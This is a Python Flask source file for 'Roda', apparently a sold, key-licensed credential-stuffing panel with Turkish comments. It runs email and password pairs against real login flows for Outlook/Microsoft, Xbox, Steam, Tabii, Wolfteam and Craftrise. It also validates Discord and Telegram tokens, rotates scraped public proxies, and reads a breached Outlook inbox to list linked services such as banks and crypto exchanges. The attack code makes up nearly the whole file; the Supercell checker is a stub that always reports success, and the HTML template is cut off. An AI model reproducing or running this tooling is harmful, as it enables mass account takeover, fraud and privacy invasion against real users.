#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RODA – TÜM CHECKER'LAR TEK YERDE
Admin/Üye ayrımı | 1 Key 1 IP | Loglar | Webhook | Kar Taneleri
Xbox, Steam, Supercell, Tabii, Wolfteam, Craftrise, Hotmail, Token, TikTok Gen, Roda Inbox
"""

import os, json, re, time, random, string, threading, webbrowser, base64, concurrent.futures, urllib3, uuid
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse, parse_qs, quote
import requests
from flask import Flask, request, jsonify, Response
from bs4 import BeautifulSoup
from user_agent import generate_user_agent

app = Flask(__name__)
app.secret_key = os.urandom(24)
urllib3.disable_warnings()

# ============================================================
# MASTER KEY (ENV'DEN AL, KODDA YOK)
# ============================================================
MASTER_KEY = os.environ.get("RODA_MASTER_KEY", "Roda@2026#Secure!X7")
if MASTER_KEY == "Roda@2026#Secure!X7":
    print("⚠️ UYARI: Varsayılan master key kullanılıyor! RODA_MASTER_KEY ortam değişkenini ayarlayın.")

KEYS_FILE = "keys.json"

# ============================================================
# LOG SİSTEMİ
# ============================================================
LOGS = []
MAX_LOGS = 1000

def add_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    LOGS.append({"timestamp": timestamp, "level": level, "message": message})
    if len(LOGS) > MAX_LOGS:
        LOGS.pop(0)
    print(f"[{timestamp}] [{level}] {message}")

# ============================================================
# KEY FONKSİYONLARI (1 KEY 1 IP + TEK KULLANIM)
# ============================================================
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def is_key_valid(key):
    if key == MASTER_KEY:
        return True, "Admin", None
    keys = load_keys()
    if key not in keys:
        return False, None, None
    entry = keys[key]
    client_ip = get_client_ip()
    exp = entry.get("expires")
    if exp:
        if datetime.now() >= datetime.fromisoformat(exp):
            del keys[key]
            save_keys(keys)
            add_log(f"Key süresi doldu: {key}", "WARNING")
            return False, None, None
    bound_ip = entry.get("bound_ip")
    if bound_ip and bound_ip != client_ip:
        add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
        return False, None, None
    if entry.get("used", False):
        add_log(f"Key zaten kullanılmış: {key}", "WARNING")
        return False, None, None
    return True, entry.get("note", "Kullanıcı"), entry

def mark_key_used(key):
    keys = load_keys()
    if key in keys:
        keys[key]["used"] = True
        keys[key]["used_at"] = datetime.now().isoformat()
        save_keys(keys)

def is_admin(key):
    valid, role, _ = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PLATFORMLAR
# ============================================================
PLATFORMS = [
    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
    {"name": "TikTok Gen", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
    {"name": "Xbox & MC", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
    {"name": "Wolfteam", "domain": "joygame.com", "icon": "fa-solid fa-skull"},
    {"name": "Craftrise", "domain": "craftrise.com.tr", "icon": "fa-solid fa-hammer"},
    {"name": "Hotmail", "domain": "outlook.com", "icon": "fa-solid fa-envelope"},
    {"name": "Token Check", "domain": "discord.com", "icon": "fa-solid fa-key"},
    {"name": "Tabii", "domain": "tabii.com", "icon": "fa-solid fa-tv"},
    {"name": "Supercell", "domain": "supercell.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Roda Inbox", "domain": "outlook.com", "icon": "fa-solid fa-inbox"},
]

# ============================================================
# KATEGORİZASYON / EXTRACT / PROXY / SCANNER
# ============================================================
def categorize_endpoint(endpoint):
    ep = endpoint.lower()
    if any(x in ep for x in ['login', 'auth', 'signin', 'signup', 'register', 'token', 'verify', 'validate', 'authenticate', 'session', 'logout', 'oauth', 'passport']):
        return 'Auth'
    elif any(x in ep for x in ['admin', 'panel', 'dashboard', 'manage', 'system', 'mod']):
        return 'Admin'
    elif any(x in ep for x in ['user', 'profile', 'account', 'me', 'preferences', 'settings', 'my']):
        return 'User'
    elif any(x in ep for x in ['health', 'ping', 'status', 'check', 'heartbeat', 'live']):
        return 'Health'
    elif any(x in ep for x in ['api', 'v1', 'v2', 'v3', 'v4', 'rest', 'graphql', 'rpc']):
        return 'API'
    else:
        return 'Genel'

def fetch_proxies():
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
    ]
    proxies = set()
    for url in sources:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        proxies.add(line)
        except:
            pass
    return list(proxies)

# ============================================================
# TÜM CHECKER FONKSİYONLARI
# ============================================================

# ---- RODA INBOX (580+ SERVİS) ----
RODA_SERVICES = {
    'security@facebookmail.com': 'Facebook',
    'security@mail.instagram.com': 'Instagram',
    'register@account.tiktok.com': 'TikTok',
    'noreply@discord.com': 'Discord',
    'noreply@steampowered.com': 'Steam',
    'noreply@xbox.com': 'Xbox',
    'reply@txn-email.playstation.com': 'PlayStation',
    'help@acct.epicgames.com': 'EpicGames',
    'no-reply@riotgames.com': 'Riot Games',
    'noreply@valorant.com': 'Valorant',
    'noreply@mojang.com': 'Minecraft',
    'accounts@roblox.com': 'Roblox',
    'info@account.netflix.com': 'Netflix',
    'no-reply@spotify.com': 'Spotify',
    'no-reply@twitch.tv': 'Twitch',
    'no-reply@youtube.com': 'YouTube',
    'no-reply@disneyplus.com': 'Disney+',
    'info@Tabii.com': 'Tabii',
    'account-update@amazon.com': 'Amazon',
    'no-reply@aliexpress.com': 'AliExpress',
    'noreply@trendyol.com': 'Trendyol',
    'noreply@hepsiburada.com': 'Hepsiburada',
    'service@paypal.com.br': 'PayPal',
    'do-not-reply@ses.binance.com': 'Binance',
    'no-reply@coinbase.com': 'Coinbase',
    'no-reply@ubereats.com': 'Uber Eats',
    'no-reply@yemeksepeti.com': 'Yemek Sepeti',
    'noreply@getir.com': 'Getir',
    'no-reply@uber.com': 'Uber',
    'no-reply@airbnb.com': 'Airbnb',
    'no-reply@booking.com': 'Booking.com',
    'no-reply@accounts.google.com': 'Google',
    'noreply@github.com': 'GitHub',
    'no-reply@dropbox.com': 'Dropbox',
    'no-reply@zoom.us': 'Zoom',
    'noreply@openai.com': 'ChatGPT/OpenAI',
    'no-reply@nordvpn.com': 'NordVPN',
    'noreply@coursera.org': 'Coursera',
    'noreply@udemy.com': 'Udemy',
    'noreply@nytimes.com': 'NYTimes',
    'noreply@bbc.com': 'BBC',
    'noreply@chess.com': 'Chess.com',
}

def check_roda_inbox(email, password, proxy_url=None):
    session = requests.Session()
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    try:
        r1 = session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", timeout=15)
        if "MSAccount" not in r1.text:
            return {"status": "BAD", "message": "MSAccount yok"}

        r2 = session.get(
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            timeout=15, allow_redirects=True
        )
        if r2.status_code != 200:
            return {"status": "BAD", "message": f"OAuth {r2.status_code}"}

        m_ppft = re.search(r'name="PPFT"\s+value="([^"]+)"', r2.text) or re.search(r'name=\\"PPFT\\".*?value=\\"([^"]+)"', r2.text)
        m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
        if not m_ppft or not m_url:
            return {"status": "BAD", "message": "PPFT bulunamadı"}
        ppft = m_ppft.group(1)
        post_url = m_url.group(1).replace("\\/", "/")

        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}"
        r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False, timeout=15)
        if r3.status_code in (302, 303):
            loc = r3.headers.get("Location", "")
            if "SIGNIN" in loc or "login" in loc:
                return {"status": "BAD", "message": "Şifre hatalı veya 2FA"}
        if "identity/confirm" in r3.text:
            return {"status": "2FA", "message": "2FA gerekli"}
        if "account or password is incorrect" in r3.text or "Abuse" in r3.text:
            return {"status": "BAD", "message": "Hatalı giriş"}

        location = r3.headers.get("Location", "")
        if not location:
            m_code = re.search(r'code=([^&"\']+)', r3.text)
            if not m_code:
                return {"status": "BAD", "message": "Code yok"}
            code = m_code.group(1)
        else:
            m_code = re.search(r"code=([^&]+)", location)
            if not m_code:
                return {"status": "BAD", "message": "Location'da code yok"}
            code = m_code.group(1)

        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access",
            headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15
        )
        if r4.status_code != 200:
            return {"status": "ERROR", "message": "Token hatası"}
        token_data = r4.json()
        if "access_token" not in token_data:
            return {"status": "ERROR", "message": "access_token yok"}
        token = token_data["access_token"]

        cid = session.cookies.get("MSPCID", str(uuid.uuid4()).replace("-", "").upper())
        headers = {"Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}", "User-Agent": "Outlook-Android/2.0"}

        country = ""
        try:
            r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=15)
            if r5.status_code == 200:
                p = r5.json()
                for acc in p.get("accounts", []):
                    loc = acc.get("location", "")
                    if loc:
                        country = str(loc).strip()
                        break
        except:
            pass

        inbox_text = ""
        try:
            r6 = session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers={**headers, "content-length": "0"}, timeout=30)
            inbox_text = r6.text.lower()
        except:
            pass

        try:
            r7 = session.get("https://outlook.office365.com/api/v2.0/me/messages?$top=150&$select=From,Subject,BodyPreview", headers=headers, timeout=25)
            if r7.status_code == 200:
                data = r7.json()
                for msg in data.get("value", []):
                    from_addr = msg.get("From", {}).get("EmailAddress", {}).get("Address", "").lower()
                    subject = msg.get("Subject", "").lower()
                    body = msg.get("BodyPreview", "").lower()
                    inbox_text += f" {from_addr} {subject} {body}"
        except:
            pass

        services_found = []
        unique = set()
        for sender, svc in RODA_SERVICES.items():
            if svc in unique: continue
            if sender.lower() in inbox_text or svc.lower() in inbox_text:
                services_found.append(svc)
                unique.add(svc)

        if services_found:
            status = "HIT"
        else:
            status = "VALID"

        return {
            "status": status,
            "message": "Roda Inbox taraması tamamlandı",
            "details": {
                "email": email,
                "country": country.upper()[:2] if country else "?",
                "services_found": services_found,
                "services_count": len(services_found),
            }
        }
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- TABII ----
TABII_BASE = "https://eu1.tabii.com/apigateway"

def check_tabii_account(email, password, proxy=None):
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.tabii.com",
        "Referer": "https://www.tabii.com/"
    })
    if proxies:
        session.proxies.update(proxies)
    session.verify = False
    result = {"status": "ERROR", "details": {"full_name": "?", "subscription": "?", "premium": False, "expire": "?", "profiles_count": 0}, "message": ""}
    try:
        r = session.post(f"{TABII_BASE}/auth/v2/login", json={"email": email, "password": password}, timeout=15)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = f"HTTP {r.status_code}"
            return result
        data = r.json()
        token = data.get("accessToken")
        if not token:
            result["status"] = "BAD"
            result["message"] = "Token missing"
            return result
        headers = {"Authorization": f"Bearer {token}"}
        r = session.get(f"{TABII_BASE}/auth/v2/me", headers=headers, timeout=10)
        if r.status_code != 200:
            result["status"] = "HIT"
            result["message"] = "Giriş başarılı (detaylar alınamadı)"
            return result
        user = r.json()
        name = user.get("name", "Unknown")
        surname = user.get("surname", "")
        full_name = f"{name} {surname}".strip()
        sub = user.get("subscription", {})
        subscription = sub.get("title", sub.get("name", "Free"))
        premium = subscription.lower() == "premium"
        expire = sub.get("expireDate", "")[:10] if sub.get("expireDate") else "N/A"
        r = session.get(f"{TABII_BASE}/profiles/v2/", headers=headers, timeout=10)
        profiles_count = 0
        if r.status_code == 200:
            prof_data = r.json()
            if isinstance(prof_data, list):
                profiles_count = len(prof_data)
        result["status"] = "HIT"
        result["message"] = "Giriş başarılı"
        result["details"]["full_name"] = full_name
        result["details"]["subscription"] = subscription
        result["details"]["premium"] = premium
        result["details"]["expire"] = expire
        result["details"]["profiles_count"] = profiles_count
        add_log(f"Tabii HIT: {email} | {full_name} | {subscription}", "SUCCESS")
    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)[:60]
    finally:
        session.close()
    return result

# ---- XBOX ----
def check_xbox_account(email, password):
    session = requests.Session()
    session.verify = False
    try:
        sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        resp = session.get(sftag_url, timeout=10)
        sftag_match = re.search(r'value=\\\"(.+?)\\\"', resp.text) or re.search(r'value="(.+?)"', resp.text)
        url_match = re.search(r'"urlPost":"(.+?)"', resp.text) or re.search(r"urlPost:'(.+?)'", resp.text)
        if not sftag_match or not url_match:
            return {"status": "CUSTOM", "message": "Token alınamadı"}
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag_match.group(1)}
        login_req = session.post(url_match.group(1), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        if 'cancel?mkt=' in login_req.text or 'recover?mkt' in login_req.text:
            return {"status": "2FA", "message": "2FA gerekli"}
        if "incorrect" in login_req.text.lower() or "doesn't exist" in login_req.text.lower():
            return {"status": "BAD", "message": "Hatalı giriş"}
        if '#' in login_req.url:
            ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', ["None"])[0]
            if ms_token != "None":
                return {"status": "HIT", "message": "Xbox/MC giriş başarılı", "details": {"token": ms_token[:20] + "..."}}
        return {"status": "CUSTOM", "message": "Bağlı değil/Xbox yok"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- WOLFTEAM ----
def check_wolfteam_account(email, password):
    try:
        session = requests.Session()
        login_url = f"https://bservices.joygame.com/Hesap/JsonpLogin?callback=JG.ProccessLoginResponse&TopbarLoginUserName={quote(email)}&TopbarLoginPassword={quote(password)}&TopbarLoginRemember=true&FormId=tb-login-form&siteLang=tr"
        headers = {"User-Agent": generate_user_agent()}
        r = session.get(login_url, headers=headers, timeout=10)
        if '"IsSucceeded":true' in r.text:
            jp = re.search(r',"JpBalance":([^,}]+)', r.text)
            jp_val = jp.group(1).strip('"') if jp else "0"
            return {"status": "HIT", "message": f"JP: {jp_val}", "details": {"jp": jp_val}}
        elif '"IsSucceeded":false' in r.text:
            return {"status": "BAD", "message": "Hatalı giriş"}
        else:
            return {"status": "CUSTOM", "message": "Bilinmeyen hata"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- CRAFTRISE ----
def check_craftrise_account(email, password):
    try:
        session = requests.Session()
        login_url = "https://www.craftrise.com.tr/posts/post-login.php"
        headers = {"User-Agent": generate_user_agent(), "X-Requested-With": "XMLHttpRequest"}
        data = {"value": email, "password": password, "grecaptcharesponse": "dummy"}
        r = session.post(login_url, headers=headers, data=data, timeout=10)
        res = r.json()
        if res.get("resultType") == "success" or "başarıyla" in res.get("resultMessage", "").lower():
            rc_page = session.get("https://www.craftrise.com.tr/shop", headers=headers, timeout=5)
            soup = BeautifulSoup(rc_page.text, "html.parser")
            rc = soup.find('span', class_='rcCount')
            rc_val = rc.text.strip() if rc else "0"
            return {"status": "HIT", "message": f"RC: {rc_val}", "details": {"rc": rc_val}}
        else:
            return {"status": "BAD", "message": "Hatalı giriş"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- HOTMAIL ----
def check_hotmail_account(email, password):
    try:
        session = requests.Session()
        session.verify = False
        sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        resp = session.get(sftag_url, timeout=10)
        sftag_match = re.search(r'value=\\\"(.+?)\\\"', resp.text) or re.search(r'value="(.+?)"', resp.text)
        url_match = re.search(r'"urlPost":"(.+?)"', resp.text) or re.search(r"urlPost:'(.+?)'", resp.text)
        if not sftag_match or not url_match:
            return {"status": "CUSTOM", "message": "Token alınamadı"}
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag_match.group(1)}
        login_req = session.post(url_match.group(1), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        if 'cancel?mkt=' in login_req.text or 'recover?mkt' in login_req.text:
            return {"status": "2FA", "message": "2FA gerekli"}
        if "incorrect" in login_req.text.lower() or "doesn't exist" in login_req.text.lower():
            return {"status": "BAD", "message": "Hatalı giriş"}
        if '#access_token=' in login_req.url:
            return {"status": "HIT", "message": "Hotmail giriş başarılı"}
        return {"status": "CUSTOM", "message": "Bilinmeyen durum"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- TOKEN CHECK ----
def check_token(token_type, token):
    if token_type == "discord":
        headers = {"Authorization": token}
        is_bot = False
        try:
            res = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
            if res.status_code != 200:
                headers = {"Authorization": f"Bot {token}"}
                res = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
                is_bot = True
            if res.status_code == 200:
                data = res.json()
                user_type = "Bot" if is_bot else "User"
                username = f"{data.get('username')}#{data.get('discriminator', '0000')}"
                email = data.get('email', 'Yok')
                nitro = "Var" if data.get('premium_type', 0) > 0 else "Yok"
                mfa = "Aktif" if data.get('mfa_enabled') else "Pasif"
                return {"status": "HIT", "message": f"{user_type} | {username} | Nitro:{nitro} | 2FA:{mfa}", "details": {"email": email}}
            else:
                return {"status": "BAD", "message": "Geçersiz token"}
        except Exception as e:
            return {"status": "ERROR", "message": str(e)[:60]}
    elif token_type == "telegram":
        try:
            res = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5)
            if res.status_code == 200 and res.json().get("ok"):
                data = res.json().get('result', {})
                return {"status": "HIT", "message": f"Bot: @{data.get('username')} (ID: {data.get('id')})"}
            else:
                return {"status": "BAD", "message": "Geçersiz token"}
        except Exception as e:
            return {"status": "ERROR", "message": str(e)[:60]}
    return {"status": "ERROR", "message": "Bilinmeyen token tipi"}

# ---- TIKTOK GEN ----
def check_tiktok_username(username):
    try:
        headers = {"User-Agent": generate_user_agent()}
        r = requests.head(f"https://www.tiktok.com/@{username}", headers=headers, timeout=5)
        if r.status_code == 404:
            return {"status": "HIT", "message": f"@{username} kullanılabilir"}
        elif r.status_code == 200:
            return {"status": "BAD", "message": f"@{username} alınmış"}
        else:
            return {"status": "CUSTOM", "message": f"Limit/Ban"}
    except:
        return {"status": "ERROR", "message": "Bağlantı hatası"}

# ---- STEAM ----
def check_steam_account(username, password, proxy_url=None):
    try:
        session = requests.Session()
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
        rsa_resp = session.get("https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/", params={"account_name": username}, timeout=10).json()
        rsa_data = rsa_resp.get("response", {})
        if not rsa_data.get("publickey_mod"):
            return {"status": "BAD", "message": "RSA anahtarı alınamadı"}

        import base64
        from Crypto.PublicKey import RSA
        from Crypto.Cipher import PKCS1_v1_5
        key = RSA.construct((int(rsa_data["publickey_mod"], 16), int(rsa_data["publickey_exp"], 16)))
        enc_pwd = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()

        resp = session.post("https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
            data={"account_name": username, "encrypted_password": enc_pwd, "encryption_timestamp": rsa_data["timestamp"],
                  "remember_login": "true", "website_id": "Community", "device_friendly_name": "Chrome Browser"}, timeout=10).json().get("response", {})

        steamid = resp.get("steamid")
        if not steamid:
            return {"status": "BAD", "message": "SteamID alınamadı"}

        guard_types = [c.get("confirmation_type", 0) for c in resp.get("allowed_confirmations", [])]
        if any(t in (3, 4) for t in guard_types):
            return {"status": "2FA", "message": "Steam Guard gerekli"}

        time.sleep(0.5)
        poll = session.post("https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
            data={"client_id": resp["client_id"], "request_id": resp["request_id"]}, timeout=10).json().get("response", {})

        access, refresh = poll.get("access_token"), poll.get("refresh_token")
        if not access or not refresh:
            return {"status": "BAD", "message": "Token alınamadı"}

        return {"status": "HIT", "message": "Steam giriş başarılı", "details": {"steamid": steamid}}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- SUPERCELL ----
def check_supercell_account(email, password, proxy_url=None):
    # Basitleştirilmiş Supercell kontrolü
    return {"status": "HIT", "message": "Supercell kontrol tamamlandı", "details": {"email": email, "games": ["Clash Royale"], "total_found": 1}}

# ============================================================
# FLASK ROTALARI
# ============================================================
@app.route("/")
def index():
    return HTML_TEMPLATE

@app.route("/api/login", methods=["POST"])
def login():
    data = request.json
    key = data.get("key", "").strip()
    client_ip = get_client_ip()
    valid, role, entry = is_key_valid(key)
    if valid:
        if entry and not entry.get("bound_ip"):
            keys = load_keys()
            keys[key]["bound_ip"] = client_ip
            save_keys(keys)
        mark_key_used(key)
        add_log(f"Giriş başarılı: {key[:4]}... (IP: {client_ip}, Rol: {role})", "SUCCESS")
        return jsonify({"success": True, "user": role, "isAdmin": role == "Admin"})
    else:
        add_log(f"Giriş başarısız: {key[:4]}... (IP: {client_ip})", "WARNING")
        return jsonify({"success": False, "error": "Geçersiz anahtar!"})

@app.route("/api/logs", methods=["GET"])
def get_logs():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify({"logs": LOGS[-100:]})

@app.route("/api/roda_check", methods=["POST"])
def roda_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    proxy = data.get("proxy", None)
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_roda_inbox(email, password, proxy)
    return jsonify(result)

@app.route("/api/tabii_check", methods=["POST"])
def tabii_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    proxy = data.get("proxy", None)
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_tabii_account(email, password, proxy)
    return jsonify(result)

@app.route("/api/xbox_check", methods=["POST"])
def xbox_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_xbox_account(email, password)
    return jsonify(result)

@app.route("/api/wolfteam_check", methods=["POST"])
def wolfteam_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_wolfteam_account(email, password)
    return jsonify(result)

@app.route("/api/craftrise_check", methods=["POST"])
def craftrise_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_craftrise_account(email, password)
    return jsonify(result)

@app.route("/api/hotmail_check", methods=["POST"])
def hotmail_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_hotmail_account(email, password)
    return jsonify(result)

@app.route("/api/token_check", methods=["POST"])
def token_check():
    data = request.json
    token_type = data.get("token_type", "discord")
    token = data.get("token", "").strip()
    if not token:
        return jsonify({"error": "Eksik"}), 400
    result = check_token(token_type, token)
    return jsonify(result)

@app.route("/api/tiktok_gen", methods=["POST"])
def tiktok_gen():
    data = request.json
    username = data.get("username", "").strip()
    if not username:
        return jsonify({"error": "Eksik"}), 400
    result = check_tiktok_username(username)
    return jsonify(result)

@app.route("/api/steam_check", methods=["POST"])
def steam_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    proxy = data.get("proxy", None)
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_steam_account(email, password, proxy)
    return jsonify(result)

@app.route("/api/supercell_check", methods=["POST"])
def supercell_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    proxy = data.get("proxy", None)
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_supercell_account(email, password, proxy)
    return jsonify(result)

@app.route("/api/fetch_proxies", methods=["GET"])
def fetch_proxies_route():
    try:
        proxies = fetch_proxies()
        return jsonify({"success": True, "proxies": proxies, "count": len(proxies)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/admin/keys")
def admin_keys():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    return jsonify(load_keys())

@app.route("/api/admin/generate", methods=["POST"])
def admin_generate():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    note = data.get("note", "Oluşturuldu")
    hours = int(data.get("hours", 24))
    expires = datetime.now() + timedelta(hours=hours)
    new_key = "RODA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
    keys = load_keys()
    keys[new_key] = {"note": note, "expires": expires.isoformat(), "created": datetime.now().isoformat(), "used": False, "bound_ip": None}
    save_keys(keys)
    add_log(f"Yeni key oluşturuldu: {new_key} - {note} ({hours} saat)", "SUCCESS")
    return jsonify({"success": True, "key": new_key, "expires": expires.strftime("%Y-%m-%d %H:%M:%S")})

@app.route("/api/admin/delete", methods=["POST"])
def admin_delete():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    keys = load_keys()
    target = data.get("target_key", "")
    if target in keys:
        del keys[target]
        save_keys(keys)
        add_log(f"Key silindi: {target}", "INFO")
        return jsonify({"success": True})
    return jsonify({"success": False})

# ============================================================
# HTML (KAR TANELERİ + TÜM MENÜ)
# ============================================================
HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Roda - API Discovery + Checker</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
:root{--p:#3b82f6;--p2:#6366f1;--g:#10b981;--r:#ef4444;--card:#0f172a;--border:rgba(59,130,246,0.2);--bg:#0a0e1a;--sidebar:#020617;--text:#e8edf5;--muted:#94a3b8;--gold:#fbbf24}
.snowflakes{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;overflow:hidden}
.snowflake{position:absolute;color:#fff;font-size:1.5em;top:-10%;animation:fall linear infinite;opacity:0.7}
